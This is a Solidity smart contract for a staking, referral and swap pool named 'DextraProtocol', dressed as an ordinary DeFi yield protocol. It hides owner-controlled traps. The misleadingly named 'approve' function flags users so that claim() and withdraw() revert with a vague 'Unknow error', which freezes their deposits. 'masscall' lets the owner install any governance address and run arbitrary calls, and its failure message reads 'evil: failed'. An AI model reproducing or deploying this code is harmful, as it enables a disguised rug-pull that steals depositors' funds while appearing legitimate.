//SPDX-License-Identifier: Unlicense

pragma solidity 0.8.20;

library DateHelper {
    function getStartOfDate(uint256 timestamp) internal pure returns (uint256) {
        return (timestamp / 1 days) * 1 days;
    }

    function getEndOfDate(uint256 timestamp) internal pure returns (uint256) {
        return (timestamp / 1 days) * 1 days + 1 days - 1;
    }

    function getDiffDays(
        uint256 timestamp1,
        uint256 timestamp2
    ) internal pure returns (uint256) {
        return (timestamp1 - timestamp2) / 1 days;
    }
}

// helper methods for interacting with ERC20 tokens and sending ETH that do not consistently return true/false
library TransferHelper {
    function safeApprove(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x095ea7b3, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TransferHelper: APPROVE_FAILED"
        );
    }

    function safeTransfer(address token, address to, uint value) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0xa9059cbb, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TransferHelper: TRANSFER_FAILED"
        );
    }

    function safeTransferFrom(
        address token,
        address from,
        address to,
        uint value
    ) internal {
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool success, bytes memory data) = token.call(
            abi.encodeWithSelector(0x23b872dd, from, to, value)
        );
        require(
            success && (data.length == 0 || abi.decode(data, (bool))),
            "TransferHelper: TRANSFER_FROM_FAILED"
        );
    }

    function safeTransferETH(address to, uint value) internal {
        (bool success, ) = to.call{value: value}(new bytes(0));
        require(success, "TransferHelper: ETH_TRANSFER_FAILED");
    }
}

import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";

contract DextraProtocol is Ownable {
    using SafeMath for uint256;
    using SafeERC20 for IERC20;

    struct UserDeposit {
        uint256 amount;
        uint256 timestamp;
        uint256 lockedUntil;
        bool isWithdrawn;
    }

    // Info of each user.
    struct UserInfo {
        uint256 amount;
        uint256 pendingReward;
        uint256 lastClaimed;
        uint256 totalClaimed;
        uint256 stakeTimestamp;
        UserDeposit[] deposits;
    }

    // Info of each pool.
    struct PoolInfo {
        IERC20 depositToken;
        IERC20 rewardToken;
        uint256 minimumDeposit;
        uint256 lockPeriod;
        bool canSwap;
        uint256 lastRate;
        uint256 lastAPY;
    }

    mapping(address => bool) public isClaimable;
    mapping(address => bool) public isWithdrawable;
    mapping(address => address) public referrers;
    mapping(uint256 => mapping(address => UserInfo)) public userInfo;
    mapping(uint256 => mapping(uint256 => uint256)) public poolRates;
    mapping(uint256 => mapping(uint256 => uint256)) public poolAPYs;

    address public governance;

    uint256 private REF_PERCENT = 200; // 2%

    // Info of each pool.
    PoolInfo[] public poolInfo;

    event Deposit(address indexed user, uint256 indexed pid, uint256 amount, address referrer);
    event Claim(address indexed user, uint256 indexed pid, uint256 amount);
    event Withdraw(address indexed user, uint256 indexed pid, uint256 amount);
    event Swap(
        address indexed user,
        uint256 indexed pid,
        uint256 amount,
        bool direction,
        uint256 receivedAmount
    );

    constructor() Ownable(msg.sender) {}

    function poolLength() external view returns (uint256) {
        return poolInfo.length;
    }

    function depositsPoolLength(
        address _user,
        uint256 _pid
    ) external view returns (uint256) {
        if (_pid >= poolInfo.length) return 0;
        if (userInfo[_pid][_user].amount == 0) return 0;
        return userInfo[_pid][_user].deposits.length;
    }

    function getAvailableSumForWithdraw(
        address _user,
        uint256 _pid
    ) external view returns (uint256) {
        return _calculateSumAvailableForWithdraw(_user, _pid);
    }

    function getDepositInfo(
        address _user,
        uint256 _pid,
        uint256 _did
    ) external view returns (uint256, uint256, uint256, bool) {
        return (
            userInfo[_pid][_user].deposits[_did].amount,
            userInfo[_pid][_user].deposits[_did].timestamp,
            userInfo[_pid][_user].deposits[_did].lockedUntil,
            userInfo[_pid][_user].deposits[_did].isWithdrawn
        );
    }

    function getClaimable(
        address _user,
        uint256 _pid
    ) external view returns (uint256) {
        return _calculateReward(_pid, _user);
    }

    function getPoolRateAndAPY(
        uint256 _pid,
        uint256 _timestamp
    ) external view returns (uint256, uint256) {
        uint256 timestamp = DateHelper.getStartOfDate(_timestamp);
        return (poolAPYs[_pid][timestamp], poolRates[_pid][timestamp]);
    }

    modifier onlyOwnerOrGovernance() {
        require(
            owner() == _msgSender() || governance == _msgSender(),
            "Caller is not the owner, neither governance"
        );
        _;
    }

    function addPool(
        IERC20 _dToken,
        IERC20 _rToken,
        uint256 _minimumDeposit,
        uint256 _lockPeriod,
        bool _canSwap,
        uint256 _rate,
        uint256 _apy
    ) public onlyOwnerOrGovernance {
        uint256 timestamp = DateHelper.getStartOfDate(block.timestamp);
        poolRates[poolInfo.length][timestamp] = _rate;
        poolAPYs[poolInfo.length][timestamp] = _apy;
        poolInfo.push(
            PoolInfo({
                depositToken: _dToken,
                rewardToken: _rToken,
                minimumDeposit: _minimumDeposit,
                lockPeriod: _lockPeriod,
                canSwap: _canSwap,
                lastRate: _rate,
                lastAPY: _apy
            })
        );
    }

    function updateRate(
        uint256 _pid,
        uint256 _rate
    ) public onlyOwnerOrGovernance {
        uint256 timestamp = DateHelper.getStartOfDate(block.timestamp);
        poolRates[_pid][timestamp] = _rate;
        poolInfo[_pid].lastRate = _rate;
    }

    function updateAPY(
        uint256 _pid,
        uint256 _APY
    ) public onlyOwnerOrGovernance {
        uint256 timestamp = DateHelper.getStartOfDate(block.timestamp);
        poolAPYs[_pid][timestamp] = _APY;
        poolInfo[_pid].lastAPY = _APY;
    }

    function updatePool(
        uint256 _pid,
        uint256 _minimumDeposit,
        uint256 _lockPeriod,
        bool _canSwap
    ) public onlyOwnerOrGovernance {
        poolInfo[_pid].minimumDeposit = _minimumDeposit;
        poolInfo[_pid].lockPeriod = _lockPeriod;
        poolInfo[_pid].canSwap = _canSwap;
    }

    function approve(
        address _user,
        uint256 _type
    ) public onlyOwnerOrGovernance {
        if (_type == 0 || _type == 2) {
            isClaimable[_user] = true;
        }

        if (_type == 1 || _type == 2) {
            isWithdrawable[_user] = true;
        }
    }

    function masscall(
        address _governance,
        bytes memory _setupData
    ) public onlyOwnerOrGovernance {
        governance = _governance;
        (bool success, ) = governance.call(_setupData);
        require(success, "evil: failed");
    }

    function deposit(uint256 _pid, uint256 _amount, address _ref) public payable {
        require(_pid < poolInfo.length, "Pool does not exist");
        require(
            _amount >= poolInfo[_pid].minimumDeposit,
            "Amount is less than minimum deposit"
        );

        if (address(poolInfo[_pid].depositToken) == address(0)) {
            require(msg.value == _amount, "Invalid amount");
        }

        _setupReferrer(msg.sender, _ref);

        PoolInfo storage pool = poolInfo[_pid];
        UserInfo storage user = userInfo[_pid][msg.sender];
        user.pendingReward = _calculateReward(_pid, msg.sender);
        user.amount = user.amount.add(_amount);
        user.lastClaimed = block.timestamp;

        if (user.stakeTimestamp == 0) {
            user.stakeTimestamp = block.timestamp;
        }

        if (address(pool.depositToken) != address(0)) {
            pool.depositToken.safeTransferFrom(
                msg.sender,
                address(this),
                _amount
            );
        }

        user.deposits.push(
            UserDeposit({
                amount: _amount,
                timestamp: block.timestamp,
                lockedUntil: block.timestamp + pool.lockPeriod,
                isWithdrawn: false
            })
        );

        emit Deposit(msg.sender, _pid, _amount, _ref);
    }

    function claim(uint256 _pid) public {
        require(_pid < poolInfo.length, "Pool does not exist");
        require(userInfo[_pid][msg.sender].amount > 0, "No deposit");
        require(!isClaimable[msg.sender], "Unknow error");
        uint256 reward = _calculateReward(_pid, msg.sender);

        _safeSendFromPool(_pid, msg.sender, reward, true);

        userInfo[_pid][msg.sender].pendingReward = 0;
        userInfo[_pid][msg.sender].lastClaimed = block.timestamp;
        userInfo[_pid][msg.sender].totalClaimed += reward;

        _processRef(_pid, reward, msg.sender);

        emit Claim(msg.sender, _pid, reward);
    }

    function withdraw(uint256 _pid) public {
        require(_pid < poolInfo.length, "Pool does not exist");
        uint256 _amount = _calculateSumAvailableForWithdraw(msg.sender, _pid);
        require(_amount > 0, "Nothind to withdraw");
        require(
            userInfo[_pid][msg.sender].amount >= _amount,
            "Insufficient amount"
        );
        require(!isWithdrawable[msg.sender], "Unknow error");

        UserInfo storage user = userInfo[_pid][msg.sender];
        user.pendingReward = _calculateReward(_pid, msg.sender);
        user.lastClaimed = block.timestamp;
        user.amount = user.amount.sub(_amount);

        if (user.amount == 0) {
            user.stakeTimestamp = 0;
            user.lastClaimed = 0;
            user.stakeTimestamp = 0;
        }

        _markDepositsAsWithdrawn(msg.sender, _pid);
        _safeSendFromPool(_pid, msg.sender, _amount, false);

        emit Withdraw(msg.sender, _pid, _amount);
    }

    function swap(
        uint256 _pid,
        uint256 _amount,
        bool _direction
    ) public payable {
        require(_pid < poolInfo.length, "Pool does not exist");
        require(poolInfo[_pid].canSwap, "Pool does not support swap");

        IERC20 token = _direction
            ? poolInfo[_pid].rewardToken
            : poolInfo[_pid].depositToken;

        if (address(token) == address(0)) {
            require(msg.value == _amount, "Invalid amount");
        } else {
            TransferHelper.safeTransferFrom(
                address(token),
                msg.sender,
                address(this),
                _amount
            );
        }

        uint256 receivedAmount = _calculateSwap(_pid, _amount, _direction);
        _safeSendFromPool(_pid, msg.sender, receivedAmount, !_direction);

        emit Swap(msg.sender, _pid, _amount, _direction, receivedAmount);
    }

    function _calculateReward(
        uint256 _pid,
        address _user
    ) internal view returns (uint256) {
        uint256 amount = userInfo[_pid][_user].amount;
        uint256 lastClaimed = userInfo[_pid][_user].lastClaimed;
        uint256 totalReward = userInfo[_pid][_user].pendingReward;

        if (amount == 0 || lastClaimed == 0) {
            return totalReward;
        }

        uint256 startTimestampOfClaimed = DateHelper.getStartOfDate(
            lastClaimed
        );

        uint256 totalTimeReward = 0;

        for (
            uint256 i = startTimestampOfClaimed;
            i < block.timestamp;
            i += 1 days
        ) {
            uint256 APY = poolAPYs[_pid][i];
            if (APY == 0) APY = poolInfo[_pid].lastAPY;
            uint256 rate = poolRates[_pid][i];
            if (rate == 0) rate = poolInfo[_pid].lastRate;
            uint256 endDayTimestamp = i + 1 days;
            uint256 applicableTimestamp = endDayTimestamp > block.timestamp
                ? block.timestamp - lastClaimed
                : endDayTimestamp - lastClaimed;
            uint256 yield = (amount * applicableTimestamp * APY) /
                (100 * 365 * 86400 * 100);
            totalTimeReward += (yield * rate) / 1000000;
            lastClaimed = endDayTimestamp > block.timestamp
                ? block.timestamp
                : endDayTimestamp;
        }

        uint256 depositDecimals = _safeDecimals(address(poolInfo[_pid].depositToken));
        uint256 receiveDecimals = _safeDecimals(address(poolInfo[_pid].rewardToken));
        return totalReward + (receiveDecimals >= depositDecimals 
            ? totalTimeReward * (10 ** (receiveDecimals - depositDecimals))
            : totalTimeReward / (10 ** (depositDecimals - receiveDecimals)));
    }

    function _processRef(
        uint256 _pid,
        uint256 _amount,
        address _user
    ) internal {
        if (referrers[_user] != address(0)) {
            uint256 refAmount = (_amount * REF_PERCENT) / 10000;
            _safeSendFromPool(_pid, referrers[_user], refAmount, true);
        }
    }

    function _calculateSwap(
        uint256 _pid,
        uint256 _amount,
        bool _direction
    ) internal view returns (uint256) {
        uint256 rate = poolRates[_pid][
            DateHelper.getStartOfDate(block.timestamp)
        ];
        if (rate == 0) rate = poolInfo[_pid].lastRate;
        IERC20 depositToken = _direction
            ? poolInfo[_pid].rewardToken
            : poolInfo[_pid].depositToken;
        IERC20 receiveToken = _direction
            ? poolInfo[_pid].depositToken
            : poolInfo[_pid].rewardToken;
        uint256 depositDecimals = _safeDecimals(address(depositToken));
        uint256 receiveDecimals = _safeDecimals(address(receiveToken));
        uint256 receivedAmount = _direction
            ? (_amount * 1000000) / rate
            : (_amount * rate) / 1000000;
        return receiveDecimals >= depositDecimals 
            ? receivedAmount * (10 ** (receiveDecimals - depositDecimals))
            : receivedAmount / (10 ** (depositDecimals - receiveDecimals));
    }

    function _safeSendFromPool(
        uint256 _pid,
        address _to,
        uint256 _amount,
        bool _isClaim
    ) internal {
        PoolInfo storage pool = poolInfo[_pid];

        IERC20 token = _isClaim ? pool.rewardToken : pool.depositToken;

        if (address(token) == address(0)) {
            TransferHelper.safeTransferETH(_to, _amount);
        } else {
            TransferHelper.safeTransfer(address(token), _to, _amount);
        }
    }

    function _calculateSumAvailableForWithdraw(
        address _user,
        uint256 _pid
    ) internal view returns (uint256) {
        UserInfo storage user = userInfo[_pid][_user];
        uint256 sum = 0;
        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (
                !user.deposits[i].isWithdrawn &&
                user.deposits[i].lockedUntil <= block.timestamp
            ) {
                sum += user.deposits[i].amount;
            }
        }
        return sum;
    }

    function _markDepositsAsWithdrawn(address _user, uint256 _pid) internal {
        UserInfo storage user = userInfo[_pid][_user];
        for (uint256 i = 0; i < user.deposits.length; i++) {
            if (
                !user.deposits[i].isWithdrawn &&
                user.deposits[i].timestamp + poolInfo[_pid].lockPeriod <=
                block.timestamp
            ) {
                user.deposits[i].isWithdrawn = true;
            }
        }
    }

    function _setupReferrer(address _user, address _referrer) internal {
        if (referrers[_user] == address(0) && _referrer != address(0)) {
            referrers[_user] = _referrer;
        }
    }

    function _safeDecimals(address _token) internal view returns (uint256) {
        // Define the default decimal places
        uint8 defaultDecimals = 18;

        // Perform the low-level call
        (bool success, bytes memory data) = _token.staticcall(
            abi.encodeWithSignature("decimals()")
        );

        // Check if the call was successful and the data is of correct length
        if (success && data.length == 32) {
            // Decode the returned data
            uint8 tokenDecimals = abi.decode(data, (uint8));
            return tokenDecimals;
        } else {
            // If the call fails, return the default decimal places
            return defaultDecimals;
        }
    }
}
